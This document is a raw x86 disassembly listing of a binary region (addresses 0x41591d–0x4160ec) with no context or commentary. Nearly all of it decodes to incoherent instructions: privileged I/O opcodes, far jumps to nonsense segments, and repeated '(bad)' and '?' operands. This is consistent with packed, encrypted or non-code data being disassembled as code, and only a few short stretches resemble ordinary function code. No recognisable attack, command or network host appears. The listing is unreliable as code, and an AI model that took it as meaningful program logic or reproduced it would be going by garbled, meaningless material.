  41591d:	mov    bl,0xd6
  41591f:	pusha  
  415920:	fdiv   QWORD PTR ds:0xb6aad1d6
  415926:	adc    dh,al
  415928:	out    dx,eax
  415929:	jbe    0x415960
  41592b:	push   eax
  41592c:	xchg   ebp,eax
  41592d:	out    dx,eax
  41592e:	mov    dh,0xc1
  415930:	pop    ebx
  415931:	mov    dh,0xd8
  415933:	cdq    
  415934:	loope  0x415986
  415936:	add    al,0xb
  415938:	fdecstp 
  41593a:	lods   eax,DWORD PTR ds:[esi]
  41593b:	push   0x41
  41593d:	fiadd  WORD PTR [ebx-0x22]
  415940:	fistp  QWORD PTR [esi]
  415942:	inc    edi
  415943:	sub    BYTE PTR [ecx+0x7c],ah
  415946:	mov    bl,0x27
  415948:	xor    DWORD PTR [esi+esi*8+0xc],0x1a5795d8
  415950:	and    BYTE PTR [ecx],ah
  415952:	mov    DWORD PTR [ecx-0x26813521],ebx
  415958:	in     eax,0xc1
  41595a:	sub    DWORD PTR [edi+0x44f67dd4],esp
  415960:	mov    ebp,0x54fa3875
  415965:	cmp    ebx,edx
  415967:	fcompp 
  415969:	mov    ecx,0x4283d285
  41596e:	sub    ebx,DWORD PTR [edx+0x4c32f341]
  415974:	test   BYTE PTR [ebp+0x66],dl
  415977:	inc    esp
  415978:	ja     0x4159d9
  41597a:	adc    al,0x9d
  41597c:	push   eax
  41597d:	xor    DWORD PTR [ecx-0x390d9cdc],0x1250ce47
  415987:	xor    DWORD PTR [edi-0x38],ebx
  41598a:	adc    BYTE PTR [ebx],0x65
  41598d:	mov    dh,BYTE PTR [eax]
  41598f:	pop    ebp
  415990:	pop    ds
  415991:	sub    eax,0xa1962e0e
  415996:	dec    eax
  415997:	int    0x2d
  415999:	pop    ebp
  41599a:	inc    edi
  41599b:	xchg   esp,eax
  41599c:	mov    cl,0x86
  41599e:	shl    BYTE PTR [eax],0x35
  4159a1:	or     esi,ebx
  4159a3:	outs   dx,DWORD PTR ds:[esi]
  4159a4:	(bad)  
  4159a5:	mov    edi,0x21dbe248
  4159aa:	sbb    eax,0xd15a5aa3
  4159af:	test   BYTE PTR [ebx-0x3784ed79],dl
  4159b5:	shl    DWORD PTR ds:0xbcb35a64,cl
  4159bb:	push   cs
  4159bc:	push   ebp
  4159bd:	mov    esp,0xe92b4959
  4159c2:	xchg   edx,eax
  4159c3:	retf   
  4159c4:	sbb    BYTE PTR [ecx],bl
  4159c6:	out    dx,al
  4159c7:	hlt    
  4159c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4159c9:	cli    
  4159ca:	clc    
  4159cb:	xchg   edx,eax
  4159cc:	jmp    0x8a79:0x371daf2e
  4159d3:	adc    al,0x22
  4159d5:	sub    edi,DWORD PTR [edi-0x11719dae]
  4159db:	mov    ebp,0x3a60d9cf
  4159e0:	push   ebp
  4159e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4159e2:	mov    eax,ds:0x8086a22f
  4159e7:	retf   
  4159e8:	xchg   esp,eax
  4159e9:	jb     0x415a2b
  4159eb:	icebp  
  4159ec:	mov    bh,0x79
  4159ee:	mov    ebx,0x3e5c0750
  4159f3:	daa    
  4159f4:	xchg   edx,eax
  4159f5:	(bad)  
  4159f6:	cmp    BYTE PTR [ecx],0xe5
  4159f9:	popf   
  4159fa:	push   esp
  4159fb:	leave  
  4159fc:	mov    es:0xd392af06,al
  415a02:	sub    al,0x3b
  415a04:	pop    edx
  415a05:	call   0x2e249ab8
  415a0a:	jg     0x415a5e
  415a0c:	mov    bl,0xb0
  415a0e:	aaa    
  415a0f:	and    DWORD PTR [edx+0x64],ebp
  415a12:	pop    es
  415a13:	call   0x715cb77a
  415a18:	inc    esp
  415a19:	pusha  
  415a1a:	push   edx
  415a1b:	cmp    bh,BYTE PTR [eax+0x6c]
  415a1e:	xor    ebp,edx
  415a20:	adc    dh,dl
  415a22:	mov    dl,0xa1
  415a24:	and    al,0xf5
  415a26:	popf   
  415a27:	aad    0x25
  415a29:	int3   
  415a2a:	jnp    0x415a23
  415a2c:	(bad)  
  415a2e:	test   DWORD PTR [ebx-0x2],esi
  415a31:	bound  esi,QWORD PTR ds:0xca82010
  415a37:	adc    ecx,ebp
  415a39:	xor    eax,0x773e5dbe
  415a3e:	pop    esi
  415a3f:	mov    ebp,0xc6f7d466
  415a44:	and    eax,0x683eedbc
  415a49:	pusha  
  415a4a:	pop    ss
  415a4b:	pop    es
  415a4c:	cmp    bh,BYTE PTR [ecx-0x27]
  415a4f:	or     al,0xc7
  415a51:	aaa    
  415a52:	xchg   ebp,eax
  415a53:	retf   0xd916
  415a56:	neg    DWORD PTR [esi-0x50]
  415a59:	xor    BYTE PTR [esp+eiz*2],cl
  415a5c:	call   ecx
  415a5e:	push   ebp
  415a5f:	cs std 
  415a61:	jecxz  0x415a1a
  415a63:	mov    esi,ebx
  415a65:	shr    BYTE PTR [edi-0x428f0ac2],0xe9
  415a6c:	out    dx,eax
  415a6d:	sub    eax,0x8699dd5b
  415a72:	rol    edi,cl
  415a74:	stos   DWORD PTR es:[edi],eax
  415a75:	outs   dx,BYTE PTR ds:[esi]
  415a76:	push   ecx
  415a77:	lea    ebp,[eax+0x39b374b3]
  415a7d:	inc    esp
  415a7e:	xor    al,0x6b
  415a80:	mov    bl,0x74
  415a82:	xor    edi,DWORD PTR [edx+0xc]
  415a85:	inc    esi
  415a86:	jo     0x415ad1
  415a88:	push   0x8dd1339c
  415a8d:	test   BYTE PTR [edx],al
  415a8f:	pushf  
  415a90:	jb     0x415ac4
  415a92:	add    cl,ch
  415a94:	fild   WORD PTR [edx]
  415a96:	add    BYTE PTR [eax],al
  415a98:	sub    dl,BYTE PTR [eax-0x24]
  415a9b:	mov    esp,0x6eaabc6a
  415aa0:	popa   
  415aa1:	pop    ecx
  415aa2:	xchg   ebp,eax
  415aa3:	aas    
  415aa4:	xchg   ecx,eax
  415aa5:	outs   dx,DWORD PTR ds:[esi]
  415aa6:	or     al,bl
  415aa8:	mov    eax,0xb9707f0d
  415aad:	jle    0x415b1f
  415aaf:	jo     0x415afb
  415ab1:	dec    esp
  415ab2:	imul   ebp,DWORD PTR [edx+0x6ebaacf8],0xa77d23a4
  415abc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415abd:	ror    DWORD PTR [ebp+0x5ee06e5e],0x2f
  415ac4:	cld    
  415ac5:	add    edi,eax
  415ac7:	mov    edx,0xa3dc40d0
  415acc:	and    DWORD PTR [eax+0x52],esi
  415acf:	scas   eax,DWORD PTR es:[edi]
  415ad0:	sub    al,0x6
  415ad2:	fmul   st(3),st
  415ad4:	xchg   BYTE PTR [ebp+0x6f036b84],bh
  415ada:	pop    eax
  415adb:	and    dl,BYTE PTR [edx+esi*1]
  415ade:	sahf   
  415adf:	shl    DWORD PTR [edi],0x63
  415ae2:	ss add al,0x20
  415ae5:	xchg   esi,eax
  415ae6:	adc    al,0x2e
  415ae8:	lea    ebp,[edi]
  415aea:	jle    0x415b11
  415aec:	xchg   esp,eax
  415aed:	mov    eax,edi
  415aef:	inc    ecx
  415af0:	push   edx
  415af1:	inc    edx
  415af2:	inc    esi
  415af3:	inc    edi
  415af4:	test   BYTE PTR [ecx-0x4bc03520],0xaf
  415afb:	jae    0x415ad4
  415afd:	in     al,dx
  415afe:	sub    dh,0x4b
  415b01:	clc    
  415b02:	fidivr WORD PTR [ecx-0x7b120dad]
  415b08:	dec    esi
  415b09:	call   0x2546093e
  415b0e:	jmp    0xa597:0x46db
  415b14:	pushf  
  415b15:	nop
  415b16:	xchg   DWORD PTR [edx],eax
  415b18:	sub    ebx,ebp
  415b1a:	retf   0x264e
  415b1d:	arpl   WORD PTR [ecx+edx*2+0x53],ax
  415b21:	xchg   ebp,eax
  415b22:	pop    edx
  415b23:	xor    edx,DWORD PTR [esi]
  415b25:	inc    ecx
  415b26:	dec    eax
  415b27:	adc    al,0xfc
  415b29:	daa    
  415b2a:	ror    DWORD PTR [esi],0x66
  415b2d:	ins    BYTE PTR es:[edi],dx
  415b2e:	xor    bl,dh
  415b30:	rol    DWORD PTR [ebx+0x7c],1
  415b33:	(bad)  
  415b34:	icebp  
  415b35:	jl     0x415b1b
  415b37:	jno    0x415b34
  415b39:	je     0x415b1c
  415b3b:	ss pop ebp
  415b3d:	sbb    ah,BYTE PTR [ebx]
  415b3f:	sub    dl,dh
  415b41:	mov    DWORD PTR [eax],esi
  415b43:	push   0x3c
  415b45:	mov    ss,WORD PTR [eax+edx*2-0x1e]
  415b49:	inc    edx
  415b4a:	retf   0x21d2
  415b4d:	aad    0x1b
  415b4f:	cwde   
  415b50:	das    
  415b51:	and    eax,0xb9c9c119
  415b56:	add    BYTE PTR [eax],dh
  415b58:	add    BYTE PTR [edx],dh
  415b5a:	adc    esp,DWORD PTR [esi-0x83c6e62]
  415b60:	adc    edi,eax
  415b62:	mov    ah,0xfd
  415b64:	aam    0xc8
  415b66:	push   esi
  415b67:	jmp    0x3b30:0xc2723adf
  415b6e:	mov    esi,0x64dba7e
  415b73:	adc    ebp,edi
  415b75:	fld    TBYTE PTR [ebp-0x573e841]
  415b7b:	jb     0x415bec
  415b7d:	sub    eax,DWORD PTR [ecx+0x4597410b]
  415b83:	pop    ds
  415b84:	in     al,dx
  415b85:	adc    DWORD PTR cs:[ecx+0x51b7f1be],ebx
  415b8c:	mov    db1,ecx
  415b8f:	into   
  415b90:	or     dh,0x9f
  415b93:	inc    esi
  415b94:	fwait
  415b95:	pop    ds
  415b96:	loope  0x415b9f
  415b98:	adc    cl,0xd2
  415b9b:	pop    ds
  415b9c:	adc    eax,DWORD PTR [ecx+0x5d970075]
  415ba2:	in     eax,0xf5
  415ba4:	mov    cl,0x63
  415ba6:	out    dx,al
  415ba7:	ret    0xa4d5
  415baa:	rep lods eax,DWORD PTR ds:[esi]
  415bac:	cmp    eax,0x5479487e
  415bb1:	daa    
  415bb2:	and    si,WORD PTR [esp+ebp*2]
  415bb6:	mov    bl,0xd4
  415bb8:	mov    edx,DWORD PTR [ebx-0x1c66f164]
  415bbe:	das    
  415bbf:	fstp   QWORD PTR ds:0xc7fce07b
  415bc5:	fwait
  415bc6:	xchg   edx,eax
  415bc7:	adc    DWORD PTR [edi+0x1e],eax
  415bca:	cwde   
  415bcb:	jmp    FWORD PTR [esi]
  415bcd:	add    BYTE PTR [esi+eax*8-0x20085a64],ch
  415bd4:	fstp   TBYTE PTR [edx+0x67]
  415bd7:	jae    0x415b65
  415bd9:	fwait
  415bda:	cmc    
  415bdb:	or     DWORD PTR [edx+0xcc2e651],edi
  415be1:	retf   0x84dd
  415be4:	or     esp,ebx
  415be6:	mov    esi,DWORD PTR [esi+0x5]
  415be9:	cs cmp eax,0xbd71d33a
  415bef:	cmp    eax,0xf87231a3
  415bf4:	js     0x415c70
  415bf6:	mov    dl,0xd1
  415bf8:	lahf   
  415bf9:	xlat   BYTE PTR ds:[ebx]
  415bfa:	and    al,0xf
  415bfc:	fild   WORD PTR [ecx+esi*4]
  415bff:	or     eax,0xf5096b20
  415c04:	mov    esp,0x9005118d
  415c09:	mov    WORD PTR [ecx+0x5e],?
  415c0c:	xlat   BYTE PTR ds:[ebx]
  415c0d:	xchg   edx,eax
  415c0e:	adc    eax,0xc798f750
  415c13:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415c14:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415c16:	push   esp
  415c17:	call   0x9b548489
  415c1c:	in     al,0xa6
  415c1e:	loop   0x415bfb
  415c20:	clc    
  415c21:	jbe    0x415c6e
  415c23:	inc    esi
  415c24:	popa   
  415c25:	adc    ecx,DWORD PTR [ebx+0xc]
  415c28:	mov    bl,0x31
  415c2a:	sar    BYTE PTR [esi],1
  415c2c:	inc    esi
  415c2d:	inc    esp
  415c2e:	fnstenv [bx+0x77]
  415c32:	and    al,BYTE PTR [esi-0x4169ea72]
  415c38:	mul    esi
  415c3a:	mov    BYTE PTR [esp+esi*2-0x4e],ch
  415c3e:	js     0x415cb2
  415c40:	ins    BYTE PTR es:[edi],dx
  415c41:	sub    al,0x36
  415c43:	leave  
  415c44:	add    DWORD PTR [ebp-0x31],ebx
  415c47:	sbb    dh,ah
  415c49:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415c4a:	mov    al,ds:0x46cff42b
  415c4f:	xor    ah,BYTE PTR [edi+0x30]
  415c52:	imul   ebp,DWORD PTR [eax+0x12],0x857a3f07
  415c59:	or     dl,BYTE PTR [ecx]
  415c5b:	loope  0x415c37
  415c5d:	adc    eax,0x88422672
  415c62:	or     ebp,DWORD PTR [eax]
  415c64:	mov    WORD PTR [ebx+0x33cdfd33],ss
  415c6a:	imul   esp,eax,0x46d09557
  415c70:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415c71:	test   DWORD PTR [edx-0x2dc40b18],edx
  415c77:	test   eax,0x6930087d
  415c7c:	outs   dx,DWORD PTR ds:[esi]
  415c7d:	jo     0x415c4a
  415c7f:	add    cl,BYTE PTR [ebx-0xc]
  415c82:	test   DWORD PTR [ebx],0xc85e38ff
  415c88:	aam    0xe9
  415c8a:	(bad)  
  415c8b:	mov    ds:0xb9f5653c,eax
  415c90:	ficom  WORD PTR [ebx]
  415c92:	mov    ds:0x2efadb00,al
  415c97:	sbb    eax,0xaa7bb4e9
  415c9c:	stos   DWORD PTR es:[edi],eax
  415c9d:	sub    DWORD PTR [ebp+0x8],esi
  415ca0:	scas   eax,DWORD PTR es:[edi]
  415ca1:	mov    esp,0xb114a13e
  415ca6:	test   al,0xa4
  415ca8:	fwait
  415ca9:	imul   esi,DWORD PTR [edi],0x69f55d36
  415caf:	das    
  415cb0:	jnp    0x415d27
  415cb2:	scas   al,BYTE PTR es:[edi]
  415cb3:	cmp    al,BYTE PTR [ebx]
  415cb5:	push   ecx
  415cb6:	cmp    al,0xd7
  415cb8:	and    DWORD PTR [ecx+0x41],edx
  415cbb:	mov    ?,WORD PTR [ebp+edi*1-0x39e0f63f]
  415cc2:	inc    ecx
  415cc3:	imul   ebx,DWORD PTR [eax+0x71],0xffffffbd
  415cc7:	jp     0x415d42
  415cc9:	add    BYTE PTR [ebx-0x3d],0xc5
  415ccd:	adc    ch,BYTE PTR [ebx-0x4246c3d0]
  415cd3:	(bad)  
  415cd4:	jp     0x415cb9
  415cd6:	dec    ebx
  415cd7:	adc    eax,0xb85c2d83
  415cdc:	mov    ds:0x75e142b1,al
  415ce1:	popa   
  415ce2:	inc    esi
  415ce3:	cmp    DWORD PTR [edx+edx*1-0x548ee55c],ebp
  415cea:	ds cdq 
  415cec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415ced:	sub    eax,0x2db79327
  415cf2:	loop   0x415cd4
  415cf4:	xor    eax,0x60158b1f
  415cf9:	sbb    DWORD PTR [edi+0x14],ebx
  415cfc:	shl    DWORD PTR [ecx-0x3],cl
  415cff:	(bad)  [edx-0x41]
  415d02:	cmp    eax,0x61d7a34d
  415d07:	lahf   
  415d08:	push   ebx
  415d09:	out    0x5c,al
  415d0b:	sahf   
  415d0c:	push   esi
  415d0d:	xor    DWORD PTR [ecx-0x6c3589fb],esi
  415d13:	icebp  
  415d14:	cld    
  415d15:	xor    al,0x4d
  415d17:	push   esp
  415d18:	sbb    bl,BYTE PTR [edx]
  415d1a:	push   edi
  415d1b:	arpl   WORD PTR [edi-0x1481dab0],ax
  415d21:	fbstp  TBYTE PTR [ebp+0x35]
  415d24:	sub    eax,0x4b8e0330
  415d29:	or     BYTE PTR [esi-0x62],dl
  415d2c:	fnstsw WORD PTR [edx]
  415d2e:	stc    
  415d2f:	in     al,dx
  415d30:	not    bl
  415d32:	pop    esp
  415d33:	add    BYTE PTR [esi+0x6b],cl
  415d36:	adc    edi,DWORD PTR [edx+0x7a1357c]
  415d3c:	add    al,BYTE PTR [ebx]
  415d3e:	sbb    ch,BYTE PTR [eax+0x0]
  415d41:	inc    ebx
  415d42:	add    al,0x3c
  415d44:	out    0xc8,eax
  415d46:	pusha  
  415d47:	mov    al,0x7b
  415d49:	xchg   BYTE PTR [ecx-0x12],bl
  415d4c:	jno    0x415ce7
  415d4e:	(bad)  
  415d4f:	ins    DWORD PTR es:[edi],dx
  415d50:	arpl   WORD PTR [ecx+0x1eaa917f],di
  415d56:	stc    
  415d57:	(bad)  
  415d58:	jmp    0x415dc7
  415d5a:	xor    eax,0x7d484c25
  415d5f:	call   0x6602:0x2f1d542
  415d66:	cmovle ebp,DWORD PTR [ebp+0x3d]
  415d6a:	stos   DWORD PTR es:[edi],eax
  415d6b:	or     al,0xf9
  415d6d:	outs   dx,DWORD PTR ds:[esi]
  415d6e:	adc    eax,DWORD PTR [ecx]
  415d70:	(bad)  [edx+edx*8]
  415d73:	(bad)  
  415d74:	jg     0x415deb
  415d76:	repnz mov edx,DWORD PTR [ebp+0x8]
  415d7a:	mov    edi,DWORD PTR [ebp-0x24]
  415d7d:	mov    DWORD PTR [edi+edx*4],eax
  415d80:	mov    eax,DWORD PTR [ebp-0x18]
  415d83:	jmp    0x416067
  415d88:	dec    eax
  415d89:	fistp  QWORD PTR [edx+0x75a9712b]
  415d8f:	arpl   bx,ax
  415d91:	pop    ss
  415d92:	jp     0x415d95
  415d94:	dec    eax
  415d95:	push   esi
  415d96:	sbb    eax,DWORD PTR ds:[ecx-0x468f80f6]
  415d9d:	jle    0x415e0f
  415d9f:	jo     0x415d42
  415da1:	xlat   BYTE PTR ds:[ebx]
  415da2:	(bad)  
  415da3:	out    dx,eax
  415da4:	sub    eax,0xc9c26040
  415daa:	cwde   
  415dab:	sbb    bh,BYTE PTR [ebx-0x61]
  415dae:	add    BYTE PTR [edx+0x7e],dl
  415db1:	inc    esp
  415db2:	hlt    
  415db3:	cmp    eax,0x337e58c2
  415db8:	mov    ah,BYTE PTR [ebx+edx*8+0xafd69e3]
  415dbf:	jns    0x415dee
  415dc1:	cmp    BYTE PTR [ebx+0x4d45c8b8],bl
  415dc7:	pop    ss
  415dc8:	sbb    esi,edx
  415dca:	into   
  415dcb:	and    al,0x87
  415dcd:	adc    BYTE PTR [edi+0x1fed1471],dl
  415dd3:	cld    
  415dd4:	jmp    0x41425d73
  415dd9:	enter  0x8248,0x3b
  415ddd:	cmp    BYTE PTR [eax],dl
  415ddf:	xlat   BYTE PTR ds:[ebx]
  415de0:	out    0xeb,al
  415de2:	xor    ebp,DWORD PTR [eax+0x27]
  415de5:	fst    QWORD PTR [edi-0x320823bd]
  415deb:	cmp    DWORD PTR [ebx+0x41],0xca4fad46
  415df2:	dec    edx
  415df3:	lahf   
  415df4:	mov    al,0x3f
  415df6:	mov    bh,0xe0
  415df8:	add    BYTE PTR [edi-0x68],dh
  415dfb:	sub    eax,0xd1d9dcd8
  415e00:	mov    edx,ebx
  415e02:	dec    esi
  415e03:	pop    edi
  415e04:	icebp  
  415e05:	jae    0x415e39
  415e07:	add    eax,0x86fa751e
  415e0c:	dec    ebp
  415e0d:	cmova  esp,DWORD PTR [edi]
  415e10:	es dec ebp
  415e12:	pop    eax
  415e13:	pop    ss
  415e14:	adc    cl,BYTE PTR [eax-0x69fe0068]
  415e1a:	push   edx
  415e1b:	push   cs
  415e1c:	stos   DWORD PTR es:[edi],eax
  415e1d:	xlat   BYTE PTR es:[ebx]
  415e1f:	sti    
  415e20:	addr16 jno 0x415e95
  415e23:	inc    ebp
  415e24:	dec    ecx
  415e25:	xchg   BYTE PTR [edx-0x53f24af7],dh
  415e2b:	aam    0x88
  415e2d:	es xchg ebx,eax
  415e2f:	xchg   ebp,eax
  415e30:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415e31:	sub    eax,0xbdbe23ab
  415e36:	fisttp DWORD PTR [esi-0x4a]
  415e39:	sbb    eax,eax
  415e3b:	rol    DWORD PTR [ebx-0x72],1
  415e3e:	and    edx,edi
  415e40:	inc    ecx
  415e41:	stc    
  415e42:	mov    ds:0xa2cf0fe,eax
  415e47:	pop    ecx
  415e48:	test   al,0xf8
  415e4a:	mov    ds:0xbd22de9,eax
  415e4f:	int3   
  415e50:	fidivr DWORD PTR [esi-0x20]
  415e53:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415e54:	pop    esp
  415e55:	jnp    0x415e1b
  415e57:	imul   edx,DWORD PTR [edx+0x10],0x2dd4b3d9
  415e5e:	push   edx
  415e5f:	xchg   ebp,eax
  415e60:	lods   eax,DWORD PTR ds:[esi]
  415e61:	fisttp WORD PTR [edx-0x5c6c03d2]
  415e67:	dec    edx
  415e68:	jmp    0x1fb9989e
  415e6d:	push   ss
  415e6e:	add    eax,DWORD PTR [eax]
  415e70:	pop    ebp
  415e71:	push   ecx
  415e72:	push   ebx
  415e73:	jb     0x415e5f
  415e75:	mov    eax,ds:0x43c5ab1b
  415e7a:	aaa    
  415e7b:	cmc    
  415e7c:	sbb    edx,edi
  415e7e:	mov    al,ds:0xb9d8d541
  415e83:	inc    eax
  415e84:	cmp    eax,DWORD PTR [edx-0x102c8db5]
  415e8a:	add    DWORD PTR [esi],esi
  415e8c:	rol    bh,cl
  415e8e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415e8f:	shr    BYTE PTR [eax],1
  415e91:	and    edi,0xffffffcd
  415e94:	mov    bh,0xb4
  415e96:	push   es
  415e97:	cli    
  415e98:	cld    
  415e99:	and    BYTE PTR [ecx+edi*1+0x224c7cc9],cl
  415ea0:	int3   
  415ea1:	mov    eax,DWORD PTR [esi+edx*4+0x50710db0]
  415ea8:	hlt    
  415ea9:	jno    0x415e74
  415eab:	enter  0xa5cb,0x25
  415eaf:	fild   DWORD PTR [esi+0x5d]
  415eb2:	push   ecx
  415eb3:	mov    dh,0xa0
  415eb5:	push   0xffffffbd
  415eb7:	mov    edx,0x9d1e54a5
  415ebc:	in     eax,0xfd
  415ebe:	sti    
  415ebf:	sub    al,0x97
  415ec1:	inc    BYTE PTR [esi]
  415ec3:	adc    ah,ah
  415ec5:	lahf   
  415ec6:	cmp    eax,0x7f75774f
  415ecb:	jbe    0x415f2a
  415ecd:	pop    esi
  415ece:	fstp   QWORD PTR [edx+eax*4]
  415ed1:	sub    dl,0xfe
  415ed4:	and    ebp,DWORD PTR [bp+si-0x55]
  415ed8:	and    al,0x51
  415eda:	hlt    
  415edb:	fnstenv [ecx+0x75954e9a]
  415ee1:	or     DWORD PTR [ecx+0x1b1b2317],edi
  415ee7:	add    BYTE PTR [ebp+0x59],ch
  415eea:	xor    eax,0x7e2e1e6d
  415eef:	push   ebp
  415ef0:	jmp    0x415e8c
  415ef2:	mov    edi,0xbf12eb61
  415ef7:	dec    esi
  415ef8:	adc    BYTE PTR [edx+0x7ab28ff2],bh
  415efe:	jge    0x415f20
  415f00:	adc    al,0x84
  415f02:	shl    BYTE PTR [ebx+0x46a74004],cl
  415f08:	ss mov edx,0x59347599
  415f0e:	dec    edi
  415f0f:	sbb    al,0x72
  415f11:	add    BYTE PTR [eax],bh
  415f13:	es ja  0x415f01
  415f16:	inc    esi
  415f17:	cdq    
  415f18:	aaa    
  415f19:	mov    eax,0x695090e4
  415f1e:	aam    0x53
  415f20:	mov    ebp,ecx
  415f22:	jne    0x415ecf
  415f24:	sti    
  415f25:	sbb    eax,0x80949d5c
  415f2a:	push   ebp
  415f2b:	jecxz  0x415f21
  415f2d:	retf   
  415f2e:	sub    DWORD PTR [ebx],0x3f
  415f31:	into   
  415f32:	in     al,dx
  415f33:	icebp  
  415f34:	cmp    edx,eax
  415f36:	fcomp  QWORD PTR [ecx+eax*2+0x41f64b75]
  415f3d:	mov    al,0x88
  415f3f:	jmp    0x415fb4
  415f41:	mov    ds:0xb474ec1b,al
  415f46:	cmp    DWORD PTR [edi-0x77],0x3d
  415f4a:	adc    eax,0xd27767
  415f4f:	sahf   
  415f50:	jg     0x415f13
  415f52:	fisubr DWORD PTR [eax-0x19419d59]
  415f58:	pop    eax
  415f59:	call   0x8e2143c
  415f5e:	jle    0x415fd7
  415f60:	pop    ecx
  415f61:	ret    0x135c
  415f64:	test   al,0xec
  415f66:	xor    eax,0xef5f0de7
  415f6b:	push   0x25
  415f6d:	add    BYTE PTR [ecx+0x3cbd4671],0x31
  415f74:	and    BYTE PTR [edi+0x48],al
  415f77:	dec    ebx
  415f78:	stos   DWORD PTR es:[edi],eax
  415f79:	int    0xe0
  415f7b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415f7c:	cmp    DWORD PTR [ebp+0x42],0xffffff9b
  415f80:	xor    al,0x38
  415f82:	and    DWORD PTR [ebx],esp
  415f84:	push   0xffffffdb
  415f86:	ins    DWORD PTR es:[edi],dx
  415f87:	jg     0x415fe9
  415f89:	(bad)  [ecx]
  415f8b:	fcom   DWORD PTR [ebp+0x48494653]
  415f91:	daa    
  415f92:	js     0x415ff6
  415f94:	or     edi,DWORD PTR [eax]
  415f96:	sub    al,0xdb
  415f98:	adc    eax,0x484650c0
  415f9d:	mov    ah,0xb4
  415fa0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415fa1:	mov    DWORD PTR [esi-0x47],eax
  415fa4:	mov    ds:0x2e4fc6ae,al
  415fa9:	pop    esp
  415faa:	loop   0x415f9e
  415fac:	in     al,dx
  415fad:	push   ss
  415fae:	dec    ebp
  415faf:	mov    dl,0xed
  415fb1:	mov    al,ds:0xa2393f65
  415fb6:	push   ecx
  415fb7:	cwde   
  415fb8:	mov    edi,0x86dab519
  415fbd:	pop    ecx
  415fbe:	fmul   DWORD PTR ds:0x67155990
  415fc4:	and    cl,BYTE PTR [edi-0x4f]
  415fc7:	imul   ebp,DWORD PTR [eax],0xda51ddfc
  415fcd:	not    BYTE PTR [ebx-0x7c02ee43]
  415fd3:	out    dx,al
  415fd4:	(bad)  
  415fd5:	jo     0x416042
  415fd7:	push   cs
  415fd8:	(bad)  
  415fda:	xchg   ecx,eax
  415fdb:	jp     0x415f77
  415fdd:	xor    ecx,eax
  415fdf:	mov    bh,0xdc
  415fe1:	push   eax
  415fe2:	mov    edi,0xcdd18e0b
  415fe7:	push   esp
  415fe8:	sahf   
  415fe9:	xchg   esp,eax
  415fea:	or     BYTE PTR [eax],ah
  415fec:	dec    ebp
  415fed:	jg     0x415ff2
  415fef:	fsub   st(5),st
  415ff1:	cdq    
  415ff2:	mov    edx,0xaec3c026
  415ff7:	aas    
  415ff8:	fbstp  TBYTE PTR [ebp-0x45]
  415ffb:	dec    esi
  415ffc:	das    
  415ffd:	dec    ecx
  415ffe:	inc    eax
  415fff:	cmp    edi,DWORD PTR [esi-0xd84bbb]
  416005:	mov    esi,0x3fe2740f
  41600a:	mov    bh,0x77
  41600c:	ret    0x1f6e
  41600f:	xchg   esp,eax
  416010:	out    0xae,eax
  416012:	pop    es
  416013:	ror    BYTE PTR [esi-0x4f27a9b2],1
  416019:	call   0x8556:0xdd6cd026
  416020:	call   0xb184bace
  416025:	push   DWORD PTR [esi-0x660b5ebf]
  41602b:	adc    edx,edx
  41602d:	inc    esp
  41602e:	dec    ecx
  41602f:	ficomp DWORD PTR [ebp+ebx*2+0x3897f64a]
  416036:	stos   BYTE PTR es:[edi],al
  416037:	xchg   edx,eax
  416038:	push   dx
  41603a:	xchg   DWORD PTR [eax+ebp*8],esp
  41603d:	popf   
  41603e:	out    dx,eax
  41603f:	jl     0x415fd6
  416041:	or     DWORD PTR [esi-0x59],ebp
  416044:	loopne 0x4160ad
  416046:	or     BYTE PTR [eax+0xc],dh
  416049:	(bad)  
  41604a:	out    0xec,al
  41604c:	or     BYTE PTR [ecx],0xd
  41604f:	call   0x4fc7:0x8f360a51
  416056:	jle    0x41604a
  416058:	jnp    0x41609d
  41605a:	shr    DWORD PTR [eax],0xca
  41605d:	jg     0x415fe3
  41605f:	sahf   
  416060:	es aam 0x57
  416063:	mov    BYTE PTR [edx],0xab
  416066:	call   0x3349b5f6
  41606b:	ror    DWORD PTR [ebp+0x729c1084],0x32
  416072:	add    BYTE PTR [ecx+0x458b0845],cl
  416078:	call   0x3355b608
  41607d:	rol    DWORD PTR [ebx],0xc6
  416080:	imul   eax,DWORD PTR [edx]
  416083:	mov    edx,DWORD PTR [ebp-0x4]
  416086:	xor    edx,ecx
  416088:	jmp    0x41636c
  41608d:	adc    ecx,DWORD PTR [edx]
  41608f:	iret   
  416090:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416091:	aad    0x61
  416093:	jae    0x41603f
  416095:	jl     0x4160ed
  416097:	cs jge 0x41605e
  41609a:	xor    eax,0x17ca74f3
  41609f:	jg     0x416111
  4160a1:	mov    ecx,0x9e70707e
  4160a6:	mov    fs,WORD PTR [edi+0xe]
  4160a9:	mov    dl,0x45
  4160ab:	or     BYTE PTR ds:0x7921881f,ch
  4160b1:	mov    ah,0x7a
  4160b3:	imul   esp,DWORD PTR [ebp-0x3d],0xffffffff
  4160b7:	aas    
  4160b8:	cli    
  4160b9:	or     eax,0xced0aa17
  4160be:	cmp    edi,esi
  4160c0:	mov    cs,WORD PTR [esp+esi*4]
  4160c3:	out    0xe6,al
  4160c5:	int    0x72
  4160c7:	jb     0x4160b7
  4160c9:	les    ecx,FWORD PTR [ebp+0x44]
  4160cc:	std    
  4160cd:	stc    
  4160ce:	leave  
  4160cf:	push   esp
  4160d0:	ins    DWORD PTR es:[edi],dx
  4160d1:	push   esp
  4160d2:	scas   al,BYTE PTR es:[edi]
  4160d3:	imul   esp,DWORD PTR [edx-0x24352250],0xde6b8ea1
  4160dd:	mov    DWORD PTR [edi+0x6824745f],edx
  4160e3:	sbb    dh,ch
  4160e5:	xor    ch,dh
  4160e7:	mov    eax,ds:0xa1361d5c
  4160ec:	mov    dl,0xa4
